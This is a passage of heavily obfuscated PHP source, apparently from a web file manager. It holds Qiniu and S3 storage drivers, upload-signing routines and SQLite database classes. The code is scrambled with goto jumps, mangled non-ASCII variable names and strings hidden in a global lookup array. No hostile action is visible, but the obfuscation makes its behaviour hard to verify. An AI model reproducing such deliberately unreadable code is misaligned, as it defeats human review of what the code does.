private function uploadToken($BËØ¼¡Öš’, $a£èÒáù§Â = 3600) { goto a‘‰²œÀš; a‘‰²œÀš: $b‘‡·Úº°Û =& $_SERVER[Æ]; $D±ÈîÃ»Ëñ = $a£èÒáù§Â; $d³î“éå = array($b‘‡·Úº°Û[1220] => $b‘‡·Úº°Û[1221]); goto CÉ±ÉÍŠñÊ; CÉ±ÉÍŠñÊ: $f›öÔèÑñÓ = null; $c‘­ò…¢À¼ = $this->auth->uploadToken($this->bucket, $f›öÔèÑñÓ, $D±ÈîÃ»Ëñ, $d³î“éå, !0); $F ¹‰×”‹¥ = empty($this->region) || $this->region == $b‘‡·Úº°Û[1222] ? $b‘‡·Úº°Û[33] : $b‘‡·Úº°Û[412] . $this->region; goto EË½®­àº; EË½®­àº: $Eœ›ÂæŸæ¾ = http_type() . "\x3a\57\57\x75\x70\154\x6f\x61\144{$F ¹‰×”‹¥}\56\161\151\x6e\151\x75\160\56\x63\157\x6d\x2f"; return array($b‘‡·Úº°Û[1223] => $c‘­ò…¢À¼, $b‘‡·Úº°Û[1224] => $Eœ›ÂæŸæ¾); goto EÙå“ªãšğ; EÙå“ªãšğ: } public function download($fÕùàµñÜ©, $Bô·¨½ºé™) { goto BŠ¤š¬ÎÎ™; BŠ¤š¬ÎÎ™: $Aò”­áİ‘  = IO::getPathInner(IO::mkfile($Bô·¨½ºé™)); if (!($F¶ÖƒçÑ°§ = $this->link($fÕùàµñÜ©))) { return !1; } $c´•Ã†ß› = 0; goto AÔ¦ÄÊ•Ì; AÔ¦ÄÊ•Ì: $f‚œ¥ÌØê = 1024 * 200; $Dˆ÷°‡êë‡ = fopen($Aò”­áİ‘ , $_SERVER[Æ][1225]); while (!0) { $fÕ™õ•ğ¹Á = $this->fileSubstr($fÕùàµñÜ©, $c´•Ã†ß›, $f‚œ¥ÌØê); if ($fÕ™õ•ğ¹Á === !1) { return !1; } fwrite($Dˆ÷°‡êë‡, $fÕ™õ•ğ¹Á); $c´•Ã†ß› += $f‚œ¥ÌØê; if (strlen($fÕ™õ•ğ¹Á) < $f‚œ¥ÌØê) { break; } } goto AÙ‡äÏ”ô; AÙ‡äÏ”ô: fclose($Dˆ÷°‡êë‡); return $Bô·¨½ºé™; goto Bò¡†Ş¥Š¤; Bò¡†Ş¥Š¤: } public function link($e¿¯™æ¾Ëß, $DšãÓ¬®¤š = '') { if (!$this->isFile($e¿¯™æ¾Ëß)) { return !1; } $d¥ÚˆÛÏŠ = $this->getHost() . $_SERVER[Æ][8] . $this->pathEncode($e¿¯™æ¾Ëß) . $DšãÓ¬®¤š; return $this->auth->privateDownloadUrl($d¥ÚˆÛÏŠ, 3600 * 12); } public function fileOut($Bóï¥Ó’, $b™òã§¸Å = false, $DÅ“ˆ˜ó‰” = false, $dÁİˆ™ã—‘ = '') { $BØëŒÅĞ =& $_SERVER[Æ]; if (!$DÅ“ˆ˜ó‰”) { $DÅ“ˆ˜ó‰” = $this->pathThis($Bóï¥Ó’); } $f²ğáí‘•ß = $b™òã§¸Å ? $BØëŒÅĞ[1226] . rawurlencode($DÅ“ˆ˜ó‰”) : $BØëŒÅĞ[33]; $fÌÅ–­ÚØÈ = $this->link($Bóï¥Ó’, $f²ğáí‘•ß); $this->fileOutLink($fÌÅ–­ÚØÈ); } public function fileOutServer($DÙßÈ‰À˜‡, $EååÂ·ÀŒ = false, $EÔ‡äó® = false, $cİ½¦é¶Ãó = '') { parent::fileOut($DÙßÈ‰À˜‡, $EååÂ·ÀŒ, $EÔ‡äó®, $cİ½¦é¶Ãó); } public function fileOutImage($CÙ’ÁöóØ , $D¡áî÷çÎ§ = 250) { $d‹Ş›ßš¤¬ = $this->link($CÙ’ÁöóØ , $_SERVER[Æ][1227] . $D¡áî÷çÎ§); $this->fileOutLink($d‹Ş›ßš¤¬); } public function fileOutImageServer($B„®ãôà¤Â, $E¦¯İÍõÀµ = 250) { parent::fileOutImage($B„®ãôà¤Â, $E¦¯İÍõÀµ); } public function hashMd5($CùŠôà±ë) { $e¸ÅÂÒÙá =& $_SERVER[Æ]; $c„Ÿæ©İŠ = $this->objectMeta($CùŠôà±ë); return isset($c„Ÿæ©İŠ[$e¸ÅÂÒÙá[196]]) ? $c„Ÿæ©İŠ[$e¸ÅÂÒÙá[196]] : !1; $cÌÏê©‹ïİ = $this->link($CùŠôà±ë, $e¸ÅÂÒÙá[1228]); } public function size($aàÏ†¨ç©¡) { $AèƒÜ‘ùÉ½ = $this->objectMeta($aàÏ†¨ç©¡); return $AèƒÜ‘ùÉ½ ? $AèƒÜ‘ùÉ½[$_SERVER[Æ][77]] : 0; } public function info($b½“Ù–¾®¿) { if ($this->isFolder($b½“Ù–¾®¿)) { return $this->folderInfo($b½“Ù–¾®¿); } else { if ($this->isFile($b½“Ù–¾®¿)) { return $this->fileInfo($b½“Ù–¾®¿); } } return !1; } public function exist($D¸Ó—ï¤Ô–) { return $this->isFile($D¸Ó—ï¤Ô–) || $this->isFolder($D¸Ó—ï¤Ô–); } public function isFile($c¿¼ãÛ´ƒ‘) { return !$this->isFolder($c¿¼ãÛ´ƒ‘) && $this->objectMeta($c¿¼ãÛ´ƒ‘); } public function isFolder($a­äã¼˜²) { return $this->cacheMethod($_SERVER[Æ][223], $a­äã¼˜²); } protected function objectMeta($AÛ¥è·‡Œ) { return $this->cacheMethod($_SERVER[Æ][224], $AÛ¥è·‡Œ); } protected function _objectMeta($FŞåæ¿½¢ù) { $C‰³Âªİ¤ =& $_SERVER[Æ]; list($A§©²¬Õ½», $b¢ó­˜¢¹) = $this->bucketManager->stat($this->bucket, $FŞåæ¿½¢ù); if ($A§©²¬Õ½») { $A§©²¬Õ½»[$C‰³Âªİ¤[77]] = intval($A§©²¬Õ½»[$C‰³Âªİ¤[1215]]); } return $A§©²¬Õ½»; } protected function _isFolder($fÂÖ¼„‹É) { $AëÂ²©Íœ =& $_SERVER[Æ]; list($AÛ¥ĞÊ½Å, $f©®÷±¤Ø§) = $this->bucketManager->listFiles($this->bucket, trim($fÂÖ¼„‹É, $AëÂ²©Íœ[8]) . $AëÂ²©Íœ[8], $AëÂ²©Íœ[33], 1, $AëÂ²©Íœ[8]); return !empty($AÛ¥ĞÊ½Å[$AëÂ²©Íœ[1214]]) || !empty($AÛ¥ĞÊ½Å[$AëÂ²©Íœ[1217]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($CåĞç©Òó) { parent::__construct($CåĞç©Òó); } public function uploadFormData($Fè…’º»á±, $eÙ ñë«Ù = 3600) { goto e±Û ¿Ü; eŸğäïì§: $b°£“ˆ­è¦ = $a…ªÀ¾©÷â[59]; $c‚©Õê®Ö¼ = gmdate($a…ªÀ¾©÷â[1134]); $aÜÚìËš• = gmdate($a…ªÀ¾©÷â[688]); goto FåÀ…ÙÒ¢˜; C†Øøİøë…: $cô“¢š›Ù = base64_encode(json_encode($DŒ‘¢±¿øŠ)); $DÓ‰ÄêÖÙ³ = hash_hmac($a…ªÀ¾©÷â[1143], $aÜÚìËš•, $a…ªÀ¾©÷â[1144] . $this->secret, !0); $e¨·±Â›ã† = hash_hmac($a…ªÀ¾©÷â[1143], $this->region, $DÓ‰ÄêÖÙ³, !0); goto BèÑ¯©ø; e±Û ¿Ü: $a…ªÀ¾©÷â =& $_SERVER[Æ]; $E‚§Ç’ƒ¨™ = $a…ªÀ¾©÷â[185]; $F¸Ã¹ÓÜ©— = $a…ªÀ¾©÷â[1133]; goto eŸğäïì§; BèÑ¯©ø: $d°ŒÍŠ“²« = hash_hmac($a…ªÀ¾©÷â[1143], $b°£“ˆ­è¦, $e¨·±Â›ã†, !0); $d¨áäĞ£õ¸ = hash_hmac($a…ªÀ¾©÷â[1143], $a­à”ò÷ˆƒ, $d°ŒÍŠ“²«, !0); $c‘‘»‹öå = hash_hmac($a…ªÀ¾©÷â[1143], $cô“¢š›Ù, $d¨áäĞ£õ¸); goto BÉóÕ¾’†º; BÉóÕ¾’†º: $DàÑ‘áŠß = array($a…ªÀ¾©÷â[199] => $a…ªÀ¾©÷â[33], $a…ªÀ¾©÷â[1145] => $a…ªÀ¾©÷â[33], $a…ªÀ¾©÷â[1104] => $E‚§Ç’ƒ¨™, $a…ªÀ¾©÷â[1108] => $F‹¡ô§¼Å, $a…ªÀ¾©÷â[1112] => $cô“¢š›Ù, $a…ªÀ¾©÷â[1146] => $aÑ ’”ÏÌ, $a…ªÀ¾©÷â[1147] => $F¸Ã¹ÓÜ©—, $a…ªÀ¾©÷â[1148] => $c‚©Õê®Ö¼, $a…ªÀ¾©÷â[1149] => $d÷Á×…ºß, $a…ªÀ¾©÷â[1150] => $c‘‘»‹öå, $a…ªÀ¾©÷â[169] => $this->getHost()); return $DàÑ‘áŠß; goto Bé±µåŞÅ; FåÀ…ÙÒ¢˜: $a­à”ò÷ˆƒ = $a…ªÀ¾©÷â[1135]; $d÷Á×…ºß = $eÙ ñë«Ù . $a…ªÀ¾©÷â[33]; $F‹¡ô§¼Å = $a…ªÀ¾©÷â[1100]; goto EÌä®Ö¤‘é; EÌä®Ö¤‘é: $E™Œ× Ğƒê = array($this->accessKey, $aÜÚìËš•, $this->region, $b°£“ˆ­è¦, $a­à”ò÷ˆƒ); $aÑ ’”ÏÌ = implode($a…ªÀ¾©÷â[8], $E™Œ× Ğƒê); $DŒ‘¢±¿øŠ = array($a…ªÀ¾©÷â[1102] => gmdate($a…ªÀ¾©÷â[1101], strtotime($a…ªÀ¾©÷â[1136])), $a…ªÀ¾©÷â[1103] => array(array($a…ªÀ¾©÷â[1105] => $this->bucket), array($a…ªÀ¾©÷â[1104] => $E‚§Ç’ƒ¨™), array($a…ªÀ¾©÷â[1106], $a…ªÀ¾©÷â[1107], $a…ªÀ¾©÷â[33]), array($a…ªÀ¾©÷â[1106], $a…ªÀ¾©÷â[1137], $a…ªÀ¾©÷â[33]), array($a…ªÀ¾©÷â[1106], $a…ªÀ¾©÷â[1138], $a…ªÀ¾©÷â[33]), array($a…ªÀ¾©÷â[1108] => $F‹¡ô§¼Å), array($a…ªÀ¾©÷â[1139] => $aÑ ’”ÏÌ), array($a…ªÀ¾©÷â[1140] => $F¸Ã¹ÓÜ©—), array($a…ªÀ¾©÷â[1141] => $c‚©Õê®Ö¼), array($a…ªÀ¾©÷â[1142] => $d÷Á×…ºß))); goto C†Øøİøë…; Bé±µåŞÅ: } public function multiUploadFormData($E™©Íİ‰Ÿ, $cæ»éˆ‹¾Ğ = 3600) { $A‡ì´ßÙÉ÷ =& $_SERVER[Æ]; $A‡ç“Ôàù = gmdate($A‡ì´ßÙÉ÷[1229]); $a½…ˆ¬‹¼’ = array(); $DŒ£÷µ¬‰ù = $this->client->getUploadId($this->bucket, $E™©Íİ‰Ÿ, $a½…ˆ¬‹¼’); if (!$DŒ£÷µ¬‰ù) { return !1; } return array($A‡ì´ßÙÉ÷[209] => $DŒ£÷µ¬‰ù, $A‡ì´ßÙÉ÷[169] => $this->getHost() . $A‡ì´ßÙÉ÷[8] . $this->pathEncode($E™©Íİ‰Ÿ), $A‡ì´ßÙÉ÷[210] => $A‡ç“Ôàù, $A‡ì´ßÙÉ÷[89] => $E™©Íİ‰Ÿ); } public function multiUploadAuthData($cÊ¢êöÕ‹, $DÃ”ùİ¢Ê‘ = array()) { goto Dºğ´¢ŸÚ; A­“óš¤¤Ø: unset($DÃ”ùİ¢Ê‘[$E©ÏÑŠ¿ö½[89]]); if (isset($DÃ”ùİ¢Ê‘[$E©ÏÑŠ¿ö½[211]])) { return $this->listUploadParts($bİØ½…öÆî, $DÃ”ùİ¢Ê‘); } $E¿ÂÄÂé Ü = array(); goto b•õ©ãœî…; Dºğ´¢ŸÚ: $E©ÏÑŠ¿ö½ =& $_SERVER[Æ]; $d²á“àİ• = isset($DÃ”ùİ¢Ê‘[$E©ÏÑŠ¿ö½[160]]) ? $DÃ”ùİ¢Ê‘[$E©ÏÑŠ¿ö½[160]] : $E©ÏÑŠ¿ö½[33]; $bİØ½…öÆî = $DÃ”ùİ¢Ê‘[$E©ÏÑŠ¿ö½[89]]; goto A­“óš¤¤Ø; bç¢ÎëæçÁ: $Aò‰“ˆøÈæ = $E©ÏÑŠ¿ö½[214]; $dµ³‡ñÌÕ = $E©ÏÑŠ¿ö½[8] . $this->pathEncode($bİØ½…öÆî) . $d²á“àİ•; $AñÍ„Æ²œê = $this->client->__getSignatureV4($E¿ÂÄÂé Ü, $eöšñœŸÈİ, $Aò‰“ˆøÈæ, $dµ³‡ñÌÕ); goto b¼óãê§ë­; b¼óãê§ë­: if (strpos($d²á“àİ•, $E©ÏÑŠ¿ö½[213]) === 0) { if (isset($E¿ÂÄÂé Ü[$E©ÏÑŠ¿ö½[1231]])) { $e‚æ¸÷¨§Ú = $E¿ÂÄÂé Ü[$E©ÏÑŠ¿ö½[1231]]; } else { if (isset($AñÍ„Æ²œê[$E©ÏÑŠ¿ö½[1231]])) { $e‚æ¸÷¨§Ú = $AñÍ„Æ²œê[$E©ÏÑŠ¿ö½[1231]]; } else { $e‚æ¸÷¨§Ú = hash($E©ÏÑŠ¿ö½[1143], $E©ÏÑŠ¿ö½[33]); } } return array($E©ÏÑŠ¿ö½[220] => $AñÍ„Æ²œê[$E©ÏÑŠ¿ö½[220]], $E©ÏÑŠ¿ö½[1231] => $e‚æ¸÷¨§Ú, $E©ÏÑŠ¿ö½[210] => $AñÍ„Æ²œê[$E©ÏÑŠ¿ö½[1234]]); } return $AñÍ„Æ²œê[$E©ÏÑŠ¿ö½[220]]; goto e™Œæ“ÙŠš; b•õ©ãœî…: if (isset($DÃ”ùİ¢Ê‘[$E©ÏÑŠ¿ö½[1230]])) { $E¿ÂÄÂé Ü[$E©ÏÑŠ¿ö½[1231]] = $DÃ”ùİ¢Ê‘[$E©ÏÑŠ¿ö½[1230]]; } $fÃ¹å…Ç¨Â = explode($E©ÏÑŠ¿ö½[171], $this->getHost()); $eöšñœŸÈİ = array($E©ÏÑŠ¿ö½[1232] => $fÃ¹å…Ç¨Â[1], $E©ÏÑŠ¿ö½[1233] => $E©ÏÑŠ¿ö½[33], $E©ÏÑŠ¿ö½[199] => $E©ÏÑŠ¿ö½[116], $E©ÏÑŠ¿ö½[1145] => $DÃ”ùİ¢Ê‘[$E©ÏÑŠ¿ö½[77]]); goto bç¢ÎëæçÁ; e™Œæ“ÙŠš: } public function listUploadParts($AÑÚŠÈ‰—, $EÎÛ¼¹ƒŸ = array()) { goto aÜ¼§èŞù•; EÜÈÑÈøÆ: if (!$D°ŒİÍù×ß) { return !1; } $c¾œâ¦â™í = $c—©¨¢ì‘”[1235]; foreach ($D°ŒİÍù×ß as $c¸£õçâ) { $c¾œâ¦â™í .= $c—©¨¢ì‘”[1236] . "\74\x50\141\162\x74\x4e\165\x6d\142\145\162\x3e{$c¸£õçâ[$c—©¨¢ì‘”[1187]]}\x3c\57\120\141\162\164\116\x75\x6d\x62\145\162\76\12" . "\74\105\124\x61\147\76{$c¸£õçâ[$c—©¨¢ì‘”[1188]]}\x3c\x2f\105\x54\141\147\76\xa" . $c—©¨¢ì‘”[1237]; } goto D˜ƒÅÁ¸; E´‚’î®Ôâ: $F‚ÑÖà³’ã = array($c—©¨¢ì‘”[1232] => $Eó„éªŞÄÚ[1], $c—©¨¢ì‘”[199] => $c—©¨¢ì‘”[116], $c—©¨¢ì‘”[1145] => strlen($c¾œâ¦â™í)); $Fİö§ñÜõ = $c—©¨¢ì‘”[212]; $b¦öËÑ×¦ = $c—©¨¢ì‘”[8] . $this->pathEncode($AÑÚŠÈ‰—) . $EÎÛ¼¹ƒŸ[$c—©¨¢ì‘”[160]]; goto b°œÎŞ´; D˜ƒÅÁ¸: $c¾œâ¦â™í .= $c—©¨¢ì‘”[1238]; $fÄÒ®ÃŒœµ = array(); $Eó„éªŞÄÚ = explode($c—©¨¢ì‘”[171], $this->getHost()); goto E´‚’î®Ôâ; aÜ¼§èŞù•: $c—©¨¢ì‘” =& $_SERVER[Æ]; $fğÔ„Áø‚¨ = str_replace($c—©¨¢ì‘”[221], $c—©¨¢ì‘”[33], $EÎÛ¼¹ƒŸ[$c—©¨¢ì‘”[160]]); $D°ŒİÍù×ß = $this->client->listParts($this->bucket, $AÑÚŠÈ‰—, $fğÔ„Áø‚¨); goto EÜÈÑÈøÆ; b°œÎŞ´: $F†‡‡Ì®§ = $this->client->__getSignatureV4($fÄÒ®ÃŒœµ, $F‚ÑÖà³’ã, $Fİö§ñÜõ, $b¦öËÑ×¦, $c¾œâ¦â™í); return array($c—©¨¢ì‘”[220] => $F†‡‡Ì®§[$c—©¨¢ì‘”[220]], $c—©¨¢ì‘”[210] => $F†‡‡Ì®§[$c—©¨¢ì‘”[1234]], $c—©¨¢ì‘”[222] => $D°ŒİÍù×ß, $c—©¨¢ì‘”[1231] => $F†‡‡Ì®§[$c—©¨¢ì‘”[1231]]); goto b¶¥Ò ¡Ä; b¶¥Ò ¡Ä: } public function link($D÷ŸĞø¢Ü›, $dƒäÙë‘áè = array()) { return parent::link($D÷ŸĞø¢Ü›, $dƒäÙë‘áè); } public function fileOut($Cí—•ì°‰, $A¨…‘ í×© = false, $e½é¹ùÍÂ = false, $BÈªÜ±òŸ¡ = '') { if (strstr($this->endpoint, $_SERVER[Æ][1239])) { return parent::fileOutServer($Cí—•ì°‰, $A¨…‘ í×©, $e½é¹ùÍÂ, $BÈªÜ±òŸ¡); } parent::fileOut($Cí—•ì°‰, $A¨…‘ í×©, $e½é¹ùÍÂ, $BÈªÜ±òŸ¡); } public function fileOutImage($DÖÅÍáÛƒ, $A±Çˆ”øíë = 250) { if (strstr($this->endpoint, $_SERVER[Æ][1239])) { return parent::fileOutImageServer($DÖÅÍáÛƒ, $A±Çˆ”øíë); } parent::fileOutImage($DÖÅÍáÛƒ, $A±Çˆ”øíë); } public function fileOutLink($d¢· ÷ê¤) { $d•»ƒ²òÜ =& $_SERVER[Æ]; if (substr($d¢· ÷ê¤, 0, 7) == $d•»ƒ²òÜ[1115]) { $d¢· ÷ê¤ = $d•»ƒ²òÜ[1116] . substr($d¢· ÷ê¤, 7); } header($d•»ƒ²òÜ[156] . $d¢· ÷ê¤); die; } public function getHost() { $bÂØñ…œáš =& $_SERVER[Æ]; $fã·“™Ù¡¢ = str_rtrim(parent::getHost(), $bÂØñ…œáš[8] . $this->bucket); $fã·“™Ù¡¢ = explode($bÂØñ…œáš[171], $fã·“™Ù¡¢); return $fã·“™Ù¡¢[0] . $bÂØñ…œáš[171] . $this->bucket . $bÂØñ…œáš[91] . $fã·“™Ù¡¢[1]; } } goto DŞ¾°Ñ•ÎÃ; BŒ‰£÷ÄÔ‹: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto Eî›²œºìĞ; a»‘ä·Ë„¥: $this->tpl = TEMPLATE . MOD . $CİÚì‚º½†[8]; $this->_classObjectID = mt_rand(0, 10000); goto C„¸°â‚©ç; E•‚…”´ÈÆ: $this->in =& $in; $this->values[$CİÚì‚º½†[6]] =& $config; $this->values[$CİÚì‚º½†[7]] =& $in; goto a»‘ä·Ë„¥; Eî›²œºìĞ: $CİÚì‚º½† =& $_SERVER[Æ]; global $in, $config; $this->config =& $config; goto E•‚…”´ÈÆ; C„¸°â‚©ç: } public function loadClass($f‹ééÍÅÖë) { if (1 === func_num_args()) { $this->{$f‹ééÍÅÖë} = new $f‹ééÍÅÖë(); } else { $a¸ì®Àƒöé = new ReflectionClass($f‹ééÍÅÖë); $e›­÷÷¬Ë = func_get_args(); array_shift($e›­÷÷¬Ë); $this->{$f‹ééÍÅÖë} = $a¸ì®Àƒöé->newInstanceArgs($e›­÷÷¬Ë); } return $this->{$f‹ééÍÅÖë}; } protected function assign($bªÈˆøÓ‘Ğ, $DÜµÌéñÕ) { $this->values[$bªÈˆøÓ‘Ğ] = $DÜµÌéñÕ; } protected function display($c²²–°Éªì) { ob_end_clean(); extract($this->values); require $this->tpl . $c²²–°Éªì; } } class DbSqliteBase extends Db { public function __construct($e¨¬„–ùê = '') { $fÉÇ²¼´ =& $_SERVER[Æ]; if (!extension_loaded($fÉÇ²¼´[9])) { think_exception(think_lang($fÉÇ²¼´[10]) . $fÉÇ²¼´[11]); } if (!empty($e¨¬„–ùê)) { if (!isset($e¨¬„–ùê[$fÉÇ²¼´[12]])) { $e¨¬„–ùê[$fÉÇ²¼´[12]] = 438; } $this->config = $e¨¬„–ùê; if (empty($this->config[$fÉÇ²¼´[13]])) { $this->config[$fÉÇ²¼´[13]] = array(); } } } public function connect($EÙÙ§«Øí• = '', $a¯»…°äïš = 0) { $E©ƒ’íÃ‚¿ =& $_SERVER[Æ]; if (!isset($this->linkID[$a¯»…°äïš])) { goto BªÀâŠƒõ; BªÀâŠƒõ: if (empty($EÙÙ§«Øí•)) { $EÙÙ§«Øí• = $this->config; } $b¼çÕé¢¶” = !empty($EÙÙ§«Øí•[$E©ƒ’íÃ‚¿[13]][$E©ƒ’íÃ‚¿[14]]) ? $EÙÙ§«Øí•[$E©ƒ’íÃ‚¿[13]][$E©ƒ’íÃ‚¿[14]] : $this->pconnect; $b™ŠÖÙÆä = $b¼çÕé¢¶” ? $E©ƒ’íÃ‚¿[15] : $E©ƒ’íÃ‚¿[16]; goto bĞ–­»…°Ö; dâå±½î×Å: @sqlite_busy_timeout($this->linkID[$a¯»…°äïš], 30000); if (1 != think_config($E©ƒ’íÃ‚¿[18])) { unset($this->config); } goto DñíÓ»ß£; bĞ–­»…°Ö: $this->linkID[$a¯»…°äïš] = $b™ŠÖÙÆä($EÙÙ§«Øí•[$E©ƒ’íÃ‚¿[17]], $EÙÙ§«Øí•[$E©ƒ’íÃ‚¿[12]]); if (!$this->linkID[$a¯»…°äïš]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto dâå±½î×Å; DñíÓ»ß£: } return $this->linkID[$a¯»…°äïš]; } public function free() { $this->queryID = null; } public function query($cëç«ºõ¢Â) { goto FìÚ…¾’Ç; e™Ñ˜ƒğñ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $a“´³Æâ’  = $this->getAll(); return $a“´³Æâ’ ; } goto C¼¥Ü·–Ú; FìÚ…¾’Ç: $eŸößˆââÎ =& $_SERVER[Æ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto F…Ôó„±”°; Fß«„‡Ó¢Ù: think_status($eŸößˆââÎ[20]); $this->queryID = sqlite_query($this->_linkID, $cëç«ºõ¢Â); $this->debug(); goto e™Ñ˜ƒğñ; F…Ôó„±”°: $this->queryStr = $cëç«ºõ¢Â; if ($this->queryID) { $this->free(); } think_action_status($eŸößˆââÎ[19], 1); goto Fß«„‡Ó¢Ù; C¼¥Ü·–Ú: } public function execute($câ¿·õõàî) { goto C„¸ì‚šİŒ; c’³îÅ‰Ğˆ: think_status($E’œ‘§ °[20]); $aÇ¡ÎòÏÄ‚ = sqlite_exec($this->_linkID, $câ¿·õõàî); $this->debug(); goto A»í˜œáƒ¼; A»í˜œáƒ¼: if (!1 === $aÇ¡ÎòÏÄ‚) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto b¢¯¦§¸®ª; C„¸ì‚šİŒ: $E’œ‘§ ° =& $_SERVER[Æ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto AÂÁ÷ãö¾ó; AÂÁ÷ãö¾ó: $this->queryStr = $câ¿·õõàî; if ($this->queryID) { $this->free(); } think_action_status($E’œ‘§ °[21], 1); goto c’³îÅ‰Ğˆ; b¢¯¦§¸®ª: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Æ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $B¿ŠÛåÃµù = sqlite_query($this->_linkID, $_SERVER[Æ][23]); if (!$B¿ŠÛåÃµù) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $BÀ×‰„ô = sqlite_query($this->_linkID, $_SERVER[Æ][24]); if (!$BÀ×‰„ô) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $C„ÈºòŠ = array(); if ($this->numRows > 0) { for ($b”ÔÈ”—ƒ = 0; $b”ÔÈ”—ƒ < $this->numRows; $b”ÔÈ”—ƒ++) { $C„ÈºòŠ[$b”ÔÈ”—ƒ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $C„ÈºòŠ; } public function getFields($aŒ©Ó½Üƒï) { $B¦İãø™à¡ =& $_SERVER[Æ]; $B¯´™ËÚÕµ = $this->query($B¦İãø™à¡[25] . $aŒ©Ó½Üƒï . $B¦İãø™à¡[26]); $FÁÑĞš‹ƒ¨ = array(); if ($B¯´™ËÚÕµ) { foreach ($B¯´™ËÚÕµ as $dÑñéèÈö => $C‹¦¡†ÀôÀ) { $FÁÑĞš‹ƒ¨[$C‹¦¡†ÀôÀ[$B¦İãø™à¡[27]]] = array($B¦İãø™à¡[28] => $C‹¦¡†ÀôÀ[$B¦İãø™à¡[27]], $B¦İãø™à¡[29] => $C‹¦¡†ÀôÀ[$B¦İãø™à¡[30]], $B¦İãø™à¡[31] => (bool) ($C‹¦¡†ÀôÀ[$B¦İãø™à¡[32]] === $B¦İãø™à¡[33]), $B¦İãø™à¡[34] => $C‹¦¡†ÀôÀ[$B¦İãø™à¡[35]], $B¦İãø™à¡[36] => strtolower($C‹¦¡†ÀôÀ[$B¦İãø™à¡[37]]) == $B¦İãø™à¡[38], $B¦İãø™à¡[39] => strtolower($C‹¦¡†ÀôÀ[$B¦İãø™à¡[40]]) == $B¦İãø™à¡[41]); } } return $FÁÑĞš‹ƒ¨; } public function getTables($aäø·ñ´ó = '') { $bí¶›¾¥‘‚ =& $_SERVER[Æ]; $cã¾òƒ´îö = $this->query($bí¶›¾¥‘‚[42] . $bí¶›¾¥‘‚[43] . $bí¶›¾¥‘‚[44]); $Fì ‹ë›Ê = array(); foreach ($cã¾òƒ´îö as $c¶‰áó¥¢× => $E½®À–œŞ) { $Fì ‹ë›Ê[$c¶‰áó¥¢×] = current($E½®À–œŞ); } return $Fì ‹ë›Ê; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $fĞ‹ñÅÊß =& $_SERVER[Æ]; $DÈ‰ùÓ²—£ = sqlite_last_error($this->_linkID); $this->error = $DÈ‰ùÓ²—£ . $fĞ‹ñÅÊß[4] . sqlite_error_string($DÈ‰ùÓ²—£); if ($fĞ‹ñÅÊß[33] != $this->queryStr) { $this->error .= LNG($fĞ‹ñÅÊß[45]) . $this->queryStr; } think_trace($this->error, $fĞ‹ñÅÊß[33], $fĞ‹ñÅÊß[46]); return $this->error; } public function escapeString($A«À‘É¡ë) { return sqlite_escape_string($A«À‘É¡ë); } public function parseLimit($c­¾Âä‡ª¬) { $B¨”¨í›•Š =& $_SERVER[Æ]; $a¦ïß·À = $B¨”¨í›•Š[33]; if (!empty($c­¾Âä‡ª¬)) { $c­¾Âä‡ª¬ = explode($B¨”¨í›•Š[47], $c­¾Âä‡ª¬); if (count($c­¾Âä‡ª¬) > 1) { $a¦ïß·À .= $B¨”¨í›•Š[48] . $c­¾Âä‡ª¬[1] . $B¨”¨í›•Š[49] . $c­¾Âä‡ª¬[0] . $B¨”¨í›•Š[50]; } else { $a¦ïß·À .= $B¨”¨í›•Š[48] . $c­¾Âä‡ª¬[0] . $B¨”¨í›•Š[50]; } } return $a¦ïß·À; } } class DbSqlite3Base extends Db { public function __construct($Fš×…²íì‰ = '') { $F–Î­áç¾… =& $_SERVER[Æ]; if (!class_exists($F–Î­áç¾…[51])) { think_exception(think_lang($F–Î­áç¾…[10]) . $F–Î­áç¾…[52]); } if (!empty($Fš×…²íì‰)) { if (!isset($Fš×…²íì‰[$F–Î­áç¾…[12]])) { $Fš×…²íì‰[$F–Î­áç¾…[12]] = 438; } $this->config = $Fš×…²íì‰; if (empty($this->config[$F–Î­áç¾…[13]])) { $this->config[$F–Î­áç¾…[13]] = array(); } } } public function connect($E×í§ëö¼ = '', $d¤Ô¡§ ‘ = 0) { $EÎ­‰‚Õ‹Å =& $_SERVER[Æ]; if (!isset($this->linkID[$d¤Ô¡§ ‘])) { if (empty($E×í§ëö¼)) { $E×í§ëö¼ = $this->config; } $this->linkID[$d¤Ô¡§ ‘] = new SQLite3($E×í§ëö¼[$EÎ­‰‚Õ‹Å[17]]); if (!$this->linkID[$d¤Ô¡§ ‘]) { think_exception($this->linkID[$d¤Ô¡§ ‘]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$d¤Ô¡§ ‘]->busyTimeout(30000); if (1 != think_config($EÎ­‰‚Õ‹Å[18])) { unset($this->config); } } return $this->linkID[$d¤Ô¡§ ‘]; } public function free() { $this->queryID = null; } public function query($Eí¿÷…õ’) { goto eô—×¶øµî; eô—×¶øµî: $eŸÉ›òæÓç =& $_SERVER[Æ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto dò±Á†ª²‘; b¯‡³¸’: think_status($eŸÉ›òæÓç[20]); $this->queryID = $this->_linkID->query($Eí¿÷…õ’); $this->debug(); goto cÒÄ‡áÒâ; cÒÄ‡áÒâ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $c¡’×æ¶¨º = $this->getAll(); $this->numRows = count($c¡’×æ¶¨º); return $c¡’×æ¶¨º; } goto Cî›ñàÔÀ; dò±Á†ª²‘: $this->queryStr = $Eí¿÷…õ’; if ($this->queryID) { $this->free(); } think_action_status($eŸÉ›òæÓç[19], 1); goto b¯‡³¸’; 